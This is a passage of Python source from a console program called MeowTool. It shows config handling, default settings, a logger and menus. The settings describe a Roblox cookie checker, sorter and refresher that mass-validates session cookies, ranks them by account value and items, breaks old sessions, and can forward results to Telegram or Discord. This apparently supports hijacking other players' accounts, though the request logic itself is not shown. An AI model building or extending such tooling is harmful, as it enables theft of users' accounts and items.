            config['Roblox']['CookieChecker']['CustomPlaces'][f'{customPlaceId}_Gamepasses'] = gamepassesList

        if customPlaceBadgesData:
            badgesList = []
            for badge in customPlaceBadgesData:
                badgeId = badge['id']
                badgeName = rmTwoSpaces(rmBracketsAndIn(rmPatternFromString(SPECIAL_CHARS, rmEmojies(str(badge['name']).strip())), round=True, square=True))
                if not badgeName:
                    badgeName = f'id{badgeId}'
                badgesList.append([badgeId, badgeName, False])
            config['Roblox']['CookieChecker']['CustomPlaces'][f'{customPlaceId}_Badges'] = badgesList

        autoSaveConfig()
    except Exception as e:
        logger.exception(f' < [ADD_CUSTOM_PLACE_RCC] > {MT_Unknown_Error}: {e}', force=True)
        return errorOrCorrectHandler(True, MT_Unknown_Error, generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Custom_Places))

# Настройки > Роблокс > Анализ транзакций > Плейсы
async def addPlaceRTA(placeId: str) -> None:
    if placeId == '0':
        return
    if not placeId.isdigit():
        return errorOrCorrectHandler(True, MT_Incorrent_Place_ID, generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places))
    if int(placeId) in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']:
        return errorOrCorrectHandler(True, MT_Place_With_This_ID_Already_Exists, generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places))

    try:
        universeId = (await sendGetRequest(f'https://apis.roblox.com/universes/v1/places/{placeId}/universe', 'JSON'))['universeId']
        if not universeId:
            return errorOrCorrectHandler(True, MT_Incorrent_Place_ID, generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places))

        placeName = (await sendGetRequest(f'https://games.roblox.com/v1/games?universeIds={universeId}', 'JSON'))['data'][0]['name']

        normalPlaceName = rmEmojies(rmPatternFromString(SPECIAL_CHARS, rmBracketsAndIn(placeName, round=True, square=True))).strip()
        if not normalPlaceName:
            normalPlaceName = f'Unknown_{placeId}'

        config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'].append(int(placeId))
        config['Roblox']['TransactionAnalysis']['Places'][placeId] = [int(placeId), [normalPlaceName, placeName], False, False, False]
        config['Roblox']['TransactionAnalysis']['Places'][f'{placeId}_Ignore_List'] = []
        autoSaveConfig()
    except Exception:
        return errorOrCorrectHandler(True, MT_Unknown_Error, generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places))

# Настройки > Роблокс > Разное > [Парсер геймпассов, Парсер бейджей]
async def parsePlaceItemsRoblox(info: dict[str, str], placeId: str, columnarHeaders: list):
    if placeId == '0':
        return
    if not placeId.isdigit():
        return errorOrCorrectHandler(True, MT_Incorrent_Place_ID, info['visualPath'])

    try:
        universeId = (await sendGetRequest(f'https://apis.roblox.com/universes/v1/places/{placeId}/universe', 'JSON'))['universeId']
        if not universeId:
            return errorOrCorrectHandler(True, MT_Incorrent_Place_ID, info['visualPath'])

        response = (await sendGetRequest(info['url'].format(universeId), 'JSON'))[info['key']]
        if not response:
            return errorOrCorrectHandler(True, info['trLabelError'], info['visualPath'])

        placeName = (await sendGetRequest(f'https://games.roblox.com/v1/games?universeIds={universeId}', 'JSON'))['data'][0]['name']
        cleanPlaceName = rmTwoSpaces(rmPatternFromString(SPECIAL_CHARS, rmBracketsAndIn(rmEmojies(placeName, replace=''), round=True, square=True))).strip()

        removeLines(3)
        cmdWriter(f' [{ANSI.FG.GREEN}>{ANSI.FG.WHITE}] {MT_Found_Data_On} {placeId} ({cleanPlaceName}):\n\n')

        parsedItems = []
        for item in response:
            id = item['id']
            name = rmTwoSpaces(rmBracketsAndIn(rmPatternFromString(SPECIAL_CHARS, rmEmojies(item['name'], replace='')), round=True, square=True))
            parsedItems.append(
                [
                    id,
                    name if name else f'id{id}',
                    f'https://www.roblox.com/{info['categoryUrl']}/{id}'
                ]
            )

        parserPath = Path('Roblox', 'Misc', f'{info['category']} parser')
        parserPath.mkdir(parents=True, exist_ok=True)
        open(parserPath / f'{placeId} ({cleanPlaceName}).txt', 'w', encoding='utf-8').write(f'\n  Meow :3\n\n  {MT_Place_ID}: {placeId}\n  {MT_Place_Name}: {placeName}\n  {MT_Place_Link}: https://www.roblox.com/games/{placeId}\n\n  [*] {info['trLabel']}\n{columnar(parsedItems, columnarHeaders, no_borders=True)}')
        cmdWriter(f'  {MT_Place_ID}: {placeId}\n  {MT_Place_Name}: {placeName}\n  {MT_Place_Link}: https://www.roblox.com/games/{placeId}\n\n  [{ANSI.FG.GREEN}*{ANSI.FG.WHITE}] {ANSI.DECOR.UNDERLINEON}{info['trLabel']}{ANSI.DECOR.UNDERLINEOFF}\n{columnar(parsedItems, columnarHeaders, no_borders=True)}\n [{ANSI.FG.CYAN}>{ANSI.FG.WHITE}] {MT_The_Data_Is_Saved_In}: Roblox\\Misc\\{info['category']} parser\\{placeId} ({cleanPlaceName}).txt\n\n')
        waitingInput()
    except Exception as e:
        logger.exception(f' < [PARSE_PLACE_ITEMS_ROBLOX] > {MT_Unknown_Error}: {e}', force=True)
        return errorOrCorrectHandler(True, MT_Unknown_Error, info['visualPath'])

### Конфиг функции

def validateConfigSettings(userConfig: TOMLDocument, defaultConfig: Table | TOMLDocument, path: Path | str = ''):
    if not isinstance(defaultConfig, (Table, TOMLDocument)):
        return

    for key in defaultConfig.keys():
        fullPath = Path(path, key) if path else key

        if key not in userConfig:
            userConfig[key] = defaultConfig[key]
            continue

        currentValue = userConfig[key]
        defaultValue = defaultConfig[key]

        if isinstance(defaultValue, (Table, TOMLDocument)):
            validateConfigSettings(currentValue, defaultValue, fullPath)
        elif isinstance(defaultValue, Item):
            if type(currentValue.unwrap()) is not type(defaultValue.unwrap()):
                try:
                    commentText = currentValue.comment
                    userConfig[key] = defaultValue
                    if commentText:
                        userConfig[key].comment(commentText)
                except AttributeError:
                    userConfig[key] = defaultValue

def defaultConfigLoaderSettings() -> TOMLDocument:
    configLoader = document()
    configLoader.add(nl())
    configLoader.add(comment('Meow :3'))
    configLoader.add(nl())

    # Loader
    configLoader.add('Loader', table())
    configLoader['Loader']['Load_Config'] = 'default'
    configLoader['Loader']['Load_Config'].comment('name of config for load on launch')
    configLoader['Loader']['Current_Config'] = 'default'

    # Saver
    configLoader.add('Saver', table())
    configLoader['Saver']['Auto_Save_Changes'] = False

    # Updater
    configLoader.add('Updater', table())
    configLoader['Updater']['Check_For_Updates'] = True
    configLoader['Updater']['Save_Old_Versions'] = False

    # Debugger
    configLoader.add('Debugger', table())
    configLoader['Debugger']['Debug'] = False
    configLoader['Debugger']['Info'] = False
    configLoader['Debugger']['Warning'] = False
    configLoader['Debugger']['Error'] = False
    configLoader['Debugger']['Exception'] = False

    # Advanced
    configLoader.add('Advanced', table())
    configLoader['Advanced']['Standard_Event_Loop_Policy'] = False

    # MeowTool
    configLoader.add('MeowTool', table())
    configLoader['MeowTool']['First_Launch'] = True
    configLoader['MeowTool']['Username'] = ''
    configLoader['MeowTool']['Username'].comment(':3')
    return configLoader

def loadConfigLoader() -> None:
    global configLoader
    configsPath = Path('Settings', 'Configs')
    configsPath.mkdir(parents=True, exist_ok=True)
    loaderPath = configsPath / '.Loader.toml'
    
    try:
        configLoader = loads(open(loaderPath, 'r', encoding='utf-8').read())
        logger.info(f'< [LOAD_CONFIG_LOADER] > {MT_Checking_Integrity_Config_Loader}...', force=True)
        validateConfigSettings(configLoader, defaultConfigLoaderSettings())
    except FileNotFoundError:
        logger.info(f'< [LOAD_CONFIG_LOADER] > {MT_Config_Loader_Not_Found_Creating}...', force=True)
        configLoader = defaultConfigLoaderSettings()
        autoSaveConfigLoader()
    except Exception as e:
        logger.exception(f'< [LOAD_CONFIG_LOADER] > {MT_Critical_Error}: {e}', force=True)
        configLoader = defaultConfigLoaderSettings()
        if loaderPath.exists():
            configsBackups = configsPath / '.backups' / currentDate('%d.%m.%Y - %H.%M.%S')
            configsBackups.mkdir(parents=True, exist_ok=True)
            logger.info(f'< [LOAD_CONFIG_LOADER] > {MT_Saving_A_Backup_Copy_Of_Loader}...', force=True)
            shutil.copyfile(
                Path(configsPath, '.Loader.toml'),
                Path(configsBackups, '.Loader.toml')
            )
            logger.info(f'< [LOAD_CONFIG_LOADER] > {MT_Successfully_Saved_A_Backup_Copy_Of_Loader}', force=True)

def getConfigOnLoad() -> str:
    try:
        configName = str(configLoader['Loader']['Load_Config'])
        return configName if configName in configFiles() else 'default'
    except Exception as e:
        logger.exception(f'< [GET_CONFIG_ON_LOAD] > {MT_Critical_Error}: {e}', force=True)
        return 'default'

def defaultConfigSettings() -> TOMLDocument:
    config = document()
    config.add(nl())
    config.add(comment('Meow :3'))
    config.add(nl())

    # General
    config.add('General', table())
    config['General']['Language'] = 'RU'
    config['General']['Console_Title'] = 'MeowTool... Meow :3'
    config['General']['Show_Label_MeowTool'] = True
    config['General']['Show_Label_by_h1kken'] = False
    config['General']['Disable_Warnings_For_Links'] = False
    config['General']['Disable_Warnings_For_Dangerous_Actions'] = False
    config['General']['Show_Amount_Of_Lines_In_Files'] = False

    # Outputs
    config.add('Outputs', table())
    config['Outputs']['Output_Total'] = True
    config['Outputs']['Play_Sound_At_The_End_Of_The_Work'] = False

    # Outputs - Telegram Bot
    config['Outputs'].add('TelegramBot', table())
    config['Outputs']['TelegramBot']['Telegram_Bot_Token'] = ''
    config['Outputs']['TelegramBot']['Telegram_Bot_Chat_ID'] = ''
    config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] = False

    # Outputs - Discord Webhook
    config['Outputs'].add('DiscordWebhook', table())
    config['Outputs']['DiscordWebhook']['Discord_Webhook_URL'] = ''
    config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'] = False

    # Proxy
    config.add('Proxy', table())

    # Proxy > Checker
    config['Proxy'].add('Checker', table())
    config['Proxy']['Checker']['Number_Of_Threads_For_Checker'] = 50
    config['Proxy']['Checker']['Timeout'] = 10
    config['Proxy']['Checker']['Timeout'].comment('maximum wait for a response from a proxy (in seconds)')
    config['Proxy']['Checker']['Save_Good_In_Custom_File'] = False
    config['Proxy']['Checker']['Save_Without_Protocol'] = False

    # Roblox
    config.add('Roblox', table())

    # Roblox > General
    config['Roblox'].add('General', table())
    config['Roblox']['General']['Symbols_Between_Warning_And_Cookie'] = 'CAEaAhAB.'
    config['Roblox']['General']['Add_Symbols_Between_Warning_And_Cookie'] = False

    # Roblox > General > Proxy
    config['Roblox']['General'].add('Proxy', table())
    config['Roblox']['General']['Proxy']['Use_Proxy'] = False
    config['Roblox']['General']['Proxy']['Auto_Protocol_If_Not_Specified'] = 'http'
    config['Roblox']['General']['Proxy']['Auto_Protocol_If_Not_Specified'].comment('Options: [ http | socks4 | socks5 ]')

    # Roblox > Cookie Sorter
    config['Roblox'].add('CookieSorter', table())
    config['Roblox']['CookieSorter']['Output_Filename'] = 'output'
    config['Roblox']['CookieSorter']['Search_For_Strings_Similar_To_Roblox_Cookie'] = True

    # Roblox > Cookie Checker
    config['Roblox'].add('CookieChecker', table())

    # Roblox > Cookie Checker > General
    config['Roblox']['CookieChecker'].add('General', table())
    config['Roblox']['CookieChecker']['General']['First_Check_All_Cookies_For_Valid'] = False
    config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker'] = 50
    config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker'] = 20
    config['Roblox']['CookieChecker']['General']['Name_Output_File_The_Same_As_Input_File'] = False
    config['Roblox']['CookieChecker']['General']['Output_Filename'] = 'output'
    config['Roblox']['CookieChecker']['General']['Output_Filename'].comment('it doesn\'t matter if \'Name_Output_File_The_Same_As_Input_File\' is enabled')
    config['Roblox']['CookieChecker']['General']['Move_Cookie_To_The_Next_Line'] = False

    # Roblox > Cookie Checker > Sorting
    config['Roblox']['CookieChecker'].add('Sorting', table())
    config['Roblox']['CookieChecker']['Sorting']['Sort'] = False
    config['Roblox']['CookieChecker']['Sorting'].add(comment('Categories'))
    for category in cookieData.listOfCookieData:
        if category[2] is int:
            config['Roblox']['CookieChecker']['Sorting'][category[1]] = [False, False, [False, []], [False, []]]
        elif category[2] is str:
            config['Roblox']['CookieChecker']['Sorting'][category[1]] = False

        match category[1]:
            case 'Gamepasses' | 'Badges':
                config['Roblox']['CookieChecker']['Sorting'][f'{category[1]}_Names'] = False
                config['Roblox']['CookieChecker']['Sorting'][f'{category[1]}_Places'] = False
            case 'Custom_Gamepasses' | 'Favorite_Places' | 'Places_Weekly_Playtime' | 'Bundles' | 'Groups_Owned' | 'Roblox_Badges':
                config['Roblox']['CookieChecker']['Sorting'][f'{category[1]}_Names'] = False

    # Roblox > Cookie Checker > Main
    config['Roblox']['CookieChecker'].add('Main', table())
    for data in cookieData.listOfCookieData:
        config['Roblox']['CookieChecker']['Main'][data[1]] = False

        if data[1] in ('Donate_All_Time', 'Rap', 'Gamepasses', 'Badges', 'Custom_Gamepasses', 'Favorite_Places', 'Bundles'):
            config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Max_Check_Pages'] = -1
            config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Max_Check_Pages'].comment('-1 - All')

        match data[1]:
            case 'Gamepasses' | 'Badges':
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Output_Mode'] = 'PlaceNames'
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Output_Mode'].comment('Options: [ Number | Names | PlaceNumber | PlaceNames ]')
            case 'Custom_Gamepasses':
                config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_Output_Mode'] = 'NameNumber'
                config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_Output_Mode'].comment('Options: [ Number | NameNumber ]')
                config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_List'] = [
                    ['Fly A Pet Potion',  False],
                    ['Ride-A-Pet Potion', False]
                ]
            case 'Favorite_Places' | 'Places_Weekly_Playtime' | 'Bundles' | 'Groups_Owned' | 'Roblox_Badges':
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Output_Mode'] = 'Names'
                config['Roblox']['CookieChecker']['Main'][f'{data[1]}_Output_Mode'].comment('Options: [ Number | Names ]')
                match data[1]:
                    case 'Favorite_Places':
                        config['Roblox']['CookieChecker']['Main']['Favorite_Places_List'] = [
                            [920587237,  'Adopt Me',         False],
                            [142823291,  'Murder Mystery 2', False],
                            [8737899170, 'Pet Simulator 99', False]
                        ]
                    case 'Places_Weekly_Playtime':
                        config['Roblox']['CookieChecker']['Main']['Places_Weekly_Playtime_List'] = [
                            [920587237,  383310974,  'Adopt Me',         False],
                            [142823291,  66654135,   'Murder Mystery 2', False],
                            [8737899170, 3317771874, 'Pet Simulator 99', False]
                        ]
                    case 'Bundles':
                        config['Roblox']['CookieChecker']['Main']['Bundles_List'] = [
                            [192, 'Korblox Deathspeaker', False],
                            [201, 'Headless Horseman',    False]
                        ]
            case 'Sessions':
                config['Roblox']['CookieChecker']['Main']['Sessions_Max_Check_Pages'] = 1
                config['Roblox']['CookieChecker']['Main']['Sessions_Max_Check_Pages'].comment('-1 - All, 1 - Must be good to avoid long wait for this \'https://imgur.com/a/TrBIdCu\'')

    # Roblox > Cookie Checker > Places
    config['Roblox']['CookieChecker'].add('Places', table())
    for place in listOfPlaces:
        config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] = False
    
    # Roblox > Cookie Checker > Places > Gamepasses and Badges
    for place in listOfPlaces:
        placeName = place.__name__
        config['Roblox']['CookieChecker'].add(placeName, table())
        if hasattr(place, 'Gamepasses'):
            config['Roblox']['CookieChecker'][placeName].add(comment('Gamepasses'))
            for gamepass in place.Gamepasses.listOfGamepasses:
                config['Roblox']['CookieChecker'][placeName][gamepass[2]] = False
        if hasattr(place, 'Badges'):
            config['Roblox']['CookieChecker'][placeName].add(comment('Badges'))
            for badge in place.Badges.listOfBadges:
                config['Roblox']['CookieChecker'][placeName][badge[2]] = False

    # Roblox > Cookie Checker > Custom Places
    config['Roblox']['CookieChecker'].add('CustomPlaces', table())
    config['Roblox']['CookieChecker']['CustomPlaces']['Show_Game_ID_Next_To_The_Name'] = False
    config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places'] = []
    config['Roblox']['CookieChecker']['CustomPlaces'].add(comment('Custom Places'))

    # Roblox > Cookie Refresher
    config['Roblox'].add('CookieRefresher', table())
    config['Roblox']['CookieRefresher']['Break_Old_Cookies'] = True

    # Roblox > Cookie Refresher > Single Mode
    config['Roblox']['CookieRefresher'].add('SingleMode', table())
    config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode'] = [1]
    config['Roblox']['CookieRefresher']['SingleMode']['Cookie_Save_Mode'].comment('Options: [ 1 | 2 ]')
    
    # Roblox > Cookie Refresher > Mass Mode
    config['Roblox']['CookieRefresher'].add('MassMode', table())
    config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode'] = [1]
    config['Roblox']['CookieRefresher']['MassMode']['Cookie_Save_Mode'].comment('Options: [ 1 | 2 ]')
    
    # Roblox > Transaction Analysis
    config['Roblox'].add('TransactionAnalysis', table())
    
    # Roblox > Transaction Analysis > General
    config['Roblox']['TransactionAnalysis'].add('General', table())
    config['Roblox']['TransactionAnalysis']['General']['First_Check_All_Cookies_For_Valid'] = False
    config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Valid_Checker'] = 50
    config['Roblox']['TransactionAnalysis']['General']['Number_Of_Threads_For_Transaction_Analysis'] = 20
    config['Roblox']['TransactionAnalysis']['General']['Indentation_By_The_Longest_Name'] = False

    # Roblox > Transaction Analysis > Places
    config['Roblox']['TransactionAnalysis'].add('Places', table())
    config['Roblox']['TransactionAnalysis']['Places']['Show_Game_ID_Next_To_The_Name'] = False
    config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'] = []
    config['Roblox']['TransactionAnalysis']['Places'].add(comment('Places'))
    return config

def loadConfig(configName: str) -> None:
    global config
    configsPath = Path('Settings', 'Configs')
    configsPath.mkdir(parents=True, exist_ok=True)
    configPath = configsPath / f'{configName}.toml'

    try:
        if configPath.exists():
            config = loads(open(configPath, 'r', encoding='utf-8').read())
            logger.info(f'< [LOAD_CONFIG] > {MT_Checking_Integrity_Config}...', force=True)
            validateConfigSettings(config, defaultConfigSettings())
        else:
            configPath = configsPath / f'{configLoader['Loader']['Current_Config']}.toml'
            if configPath.exists():
                config = loads(open(configPath, 'r', encoding='utf-8').read())
            else:
                config = defaultConfigSettings()

        configLoader['Loader']['Current_Config'] = configName
        open(configsPath / '.Loader.toml', 'w', encoding='utf-8').write(dumps(configLoader))
        open(configsPath / f'{configName}.toml', 'w', encoding='utf-8').write(dumps(config))
    except Exception as e:
        logger.exception(f'< [LOAD_CONFIG] > {MT_Critical_Error}: {e}', force=True)
        config = defaultConfigSettings()
        if configPath.exists():
            configsBackups = configsPath / '.backups' / currentDate('%d.%m.%Y - %H.%M.%S')
            configsBackups.mkdir(parents=True, exist_ok=True)
            logger.info(f'< [LOAD_CONFIG] > {MT_Saving_A_Backup_Copy_Of_Config}...', force=True)
            shutil.copyfile(
                Path(configsPath, f'{configName}.toml'),
                Path(configsBackups, f'{configName}.toml')
            )
            logger.info(f'< [LOAD_CONFIG] > {MT_Successfully_Saved_A_Backup_Copy_Of_Config}', force=True)

def configFiles(*, loweredFilenames: bool = False) -> list[str]:
    configs = []
    configsPath = Path('Settings', 'Configs')
    convertName = str.lower if loweredFilenames else (lambda x: x)
    for file in configsPath.iterdir():
        loweredFilename = file.name.lower()
        if loweredFilename.endswith('.toml') and loweredFilename != '.loader.toml' and len(loweredFilename) <= 55:
            configs.append(convertName(file.stem))
    return configs

def printConfigs(configs: list[str]) -> None:
    amount = len(str(len(configs))) + 12
    for index, config in enumerate(configs):
        cmdWriter(f' {f'[{ANSI.FG.PINK}{index + 1}{ANSI.FG.WHITE}]':>{amount}} ┃ {enabledOrDisabledOption(configLoader['Loader']['Current_Config'] == config)} {config}\n')

def createConfig(nameOfNewConfig: str, configsList: list[str]) -> None:
    if nameOfNewConfig == '0':
        return
    if nameOfNewConfig.lower() in ('', '.loader') or any(char in nameOfNewConfig for char in FILENAME_SPECIAL_CHARS):
        return errorOrCorrectHandler(True, MT_Incorrect_Filename, generateVisualPath(MT_Settings, MT_Configs))
    if len(nameOfNewConfig) > 50:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_Name.format('50'), generateVisualPath(MT_Settings, MT_Configs))
    if nameOfNewConfig.lower() in [file.lower() for file in configsList]:
        return errorOrCorrectHandler(True, MT_File_With_This_Name_Already_Exists, generateVisualPath(MT_Settings, MT_Configs))

    shutil.copyfile(
        Path('Settings', 'Configs', f'{configLoader['Loader']['Current_Config']}.toml'),
        Path('Settings', 'Configs', f'{nameOfNewConfig}.toml')
    )
    loadConfig(nameOfNewConfig)
    autoSaveConfig()

def renameConfig(chosenConfig: str, newNameOfConfig: str, configPath: Path) -> None:
    if newNameOfConfig == '0':
        return removeLines(7)
    if newNameOfConfig.lower() in ('', '.loader') or any(char in newNameOfConfig for char in FILENAME_SPECIAL_CHARS):
        return errorOrCorrectHandler(True, MT_Incorrect_Filename, generateVisualPath(MT_Settings, MT_Configs))
    if len(newNameOfConfig) > 50:
        return errorOrCorrectHandler(True, MT_Incorrect_Length_Of_Name.format('50'), generateVisualPath(MT_Settings, MT_Configs))
    if not (configPath / f'{chosenConfig}.toml').exists():
        return errorOrCorrectHandler(True, f'{MT_File_Is_Missing}...', generateVisualPath(MT_Settings, MT_Configs))
    if newNameOfConfig.lower() in configFiles(loweredFilenames=True):
        return errorOrCorrectHandler(True, MT_File_With_This_Name_Already_Exists, generateVisualPath(MT_Settings, MT_Configs))

    (configPath / f'{chosenConfig}.toml').rename(configPath / f'{newNameOfConfig}.toml')
    for option in ['Load_Config', 'Current_Config']:
        if configLoader['Loader'][option] == chosenConfig:
            configLoader['Loader'][option] = newNameOfConfig
    open(configPath / '.Loader.toml', 'w', encoding='utf-8').write(dumps(configLoader))
    removeLines(7)

def configContextMenu(chosenConfig: str) -> None:
    labelASCII()
    configPath = Path('Settings', 'Configs')
    whileTrueStage3 = True
    while whileTrueStage3:
        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Configs, chosenConfig)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configLoader['Loader']['Load_Config'] == chosenConfig)} {MT_Load_On_Launch}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Save[0]}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Load}\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {MT_Rename}\n [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ {MT_File_Location}\n  ┃\n [{ANSI.FG.YELLOW}R{ANSI.FG.WHITE}] ┃ {MT_Reset_To_Default_Settings}\n [{ANSI.FG.RED}D{ANSI.FG.WHITE}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
        configTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
        match configTab:
            case '1':
                configLoader['Loader']['Load_Config'] = chosenConfig if (configLoader['Loader']['Load_Config'] != chosenConfig) else 'default'
                open(configPath / '.Loader.toml', 'w', encoding='utf-8').write(dumps(configLoader))
            case '2':
                open(configPath / f'{configLoader['Loader']['Current_Config']}.toml', 'w', encoding='utf-8').write(dumps(config))
            case '3':
                loadConfig(chosenConfig)
            case '4':
                removeLines(11)
                newNameOfConfig = input(f' [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_Not_Use_This_Characters}: \\, /, :, *, ?, ", <, >, |\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_New_Name_For_Config}: ').strip()
                renameConfig(chosenConfig, newNameOfConfig, configPath)
                if not (configPath / f'{chosenConfig}.toml').exists():
                    whileTrueStage3 = False
            case '5':
                configPath.mkdir(parents=True, exist_ok=True)
                openFile(configPath, highlightFile=True, filename=f'{chosenConfig}.toml')
            case 'R' | 'К':
                isResetted = None
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    removeLines(13)
                    whileTrueStage4 = True
                    while whileTrueStage4:
                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Configs, chosenConfig)}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
                        confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                        match confirmTheAction:
                            case 'Y' | 'Н':
                                isResetted = True
                                with open(configPath / f'{chosenConfig}.toml', 'w', encoding='utf-8') as file:
                                    file.write(dumps(defaultConfigSettings()))
                                whileTrueStage4 = False
                            case 'N' | 'Т':
                                whileTrueStage4 = False
                        removeLines(8)
                else:
                    isResetted = True
                    with open(configPath / f'{chosenConfig}.toml', 'w', encoding='utf-8') as file:
                        file.write(dumps(defaultConfigSettings()))
                    removeLines(13)

                currentConfig = configLoader['Loader']['Current_Config']
                if isResetted and chosenConfig == currentConfig:
                    loadConfig(currentConfig)
            case 'D' | 'В':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    removeLines(13)
                    whileTrueStage4 = True
                    while whileTrueStage4:
                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Configs, chosenConfig)}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
                        confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                        match confirmTheAction:
                            case 'Y' | 'Н':
                                try: (configPath / f'{chosenConfig}.toml').unlink()
                                except Exception: ...

                                if chosenConfig == configLoader['Loader']['Current_Config']:
                                    loadConfig('default')

                                whileTrueStage3 = False
                                whileTrueStage4 = False
                            case 'N' | 'Т':
                                whileTrueStage4 = False
                        removeLines(8)
                else:
                    whileTrueStage3 = False
                    try: (configPath / f'{chosenConfig}.toml').unlink()
                    except Exception: ...
                    if configLoader['Loader']['Current_Config'] not in configFiles():
                        loadConfig('default')
                    removeLines(13)
            case '0':
                whileTrueStage3 = False
            case 'F' | 'А':
                labelASCII()
            case _:
                removeLines(13)
        
        autoSaveConfigAndRemoveLinesInSettings(configTab, (), ('1', '2', '3', '5', '0'), 13)

### Логгер

class Logger:
    def __init__(self, name: str, *, stream=False, level=logging.DEBUG):
        self._logger = logging.getLogger(name)
        self._logger.setLevel(level)
        self._path = Path('Logs', f'log ({currentDate('%d.%m.%Y - %H.%M.%S')}).log')
        self._path.parent.mkdir(parents=True, exist_ok=True)
        
        if not self._logger.handlers:
            formatter = logging.Formatter('%(asctime)s > [%(name)s] > %(levelname)s | %(message)s')

            if stream:
                consoleHandler = logging.StreamHandler()
                consoleHandler.setLevel(logging.DEBUG)
                consoleHandler.setFormatter(formatter)
                self._logger.addHandler(consoleHandler)
            
            fileHandler = logging.handlers.RotatingFileHandler(
                filename=self._path,
                maxBytes=1024*1024*5,
                backupCount=5,
                encoding='utf-8'
            )
            fileHandler.setFormatter(formatter)
            fileHandler.setLevel(logging.DEBUG)
            self._logger.addHandler(fileHandler)
            
        self._logger.info(f'{MT_Eared_Assistant_Is_Watching}...')
    
    def debug(self, message: str = '', *, force: bool = False):
        if force or configLoader['Debugger']['Debug']:
            self._logger.debug(message)
    
    def info(self, message: str = '', *, force: bool = False):
        if force or configLoader['Debugger']['Info']:
            self._logger.info(message)
    
    def warning(self, message: str = '', *, force: bool = False):
        if force or configLoader['Debugger']['Warning']:
            self._logger.warning(message)
    
    def error(self, message: str = '', *, force: bool = False):
        if force or configLoader['Debugger']['Error']:
            self._logger.error(message)
    
    def exception(self, message: str = '', *, force: bool = False):
        if force or configLoader['Debugger']['Exception']:
            self._logger.exception(message)

### Меню

async def mainMenu() -> None:
    labelASCII()
    while True:
        # Главное меню
        userName = str(configLoader['MeowTool']['Username']).strip()
        mainDecorators = [12, f'  {ANSI.FG.GREEN}>{ANSI.FG.WHITE} {MT_Hi}, {ANSI.FG.PINK}{userName}{ANSI.FG.WHITE}! :3\n\n'] if userName else [10, '']
        cmdWriter(f' {generateVisualPath()}\n\n{mainDecorators[1]} [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Proxy}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Roblox}\n  ┃\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {MT_Settings}\n [{ANSI.FG.YELLOW}I{ANSI.FG.WHITE}] ┃ {MT_About_The_Program}\n [{ANSI.FG.RED}0{ANSI.FG.WHITE}] ┃ {MT_Close_Program}\n\n')
        mainTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').strip()
        match mainTab:
            # Прокси
            case '1':
                whileTrueStage1 = True
                removeLines(mainDecorators[0])
                while whileTrueStage1:
